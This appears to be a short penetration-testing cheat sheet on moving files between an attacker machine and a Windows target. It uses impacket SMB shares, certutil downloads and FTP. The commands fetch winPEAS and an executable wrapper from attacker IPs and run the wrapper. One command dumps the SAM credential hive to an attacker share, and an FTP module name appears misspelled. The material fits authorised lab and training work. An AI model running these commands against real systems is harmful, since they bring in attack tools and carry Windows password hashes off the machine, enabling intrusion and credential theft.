# File Upload

## SMB Server

```
On attacker box share current directory

sudo impacket-smbserver a .

On target box copy file to share

cd %tmp%
copy \\10.11.9.134\a\winPEAS.bat
```

```
sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword

net use \\10.50.195.170\share /USER:user s3cureP@ssword
copy \\10.50.195.170\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
"%TEMP%\wrapper-USERNAME.exe"
```

```
Move files to attacker machine

reg.exe save HKLM\SAM \\ATTACKING_IP\share\sam.bak
or
move sam.bak \\ATTACKING_IP\share\sam.bak
```

## Downloading winPEAS files with Certutil

```
winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe

certutil -urlcache -f http://10.10.15.5/winPEASx64.exe winpeas.exe
```

## FTP

```
python -m pyftplib 21 (attacker machine)
ftp ATTACKER_IP
```
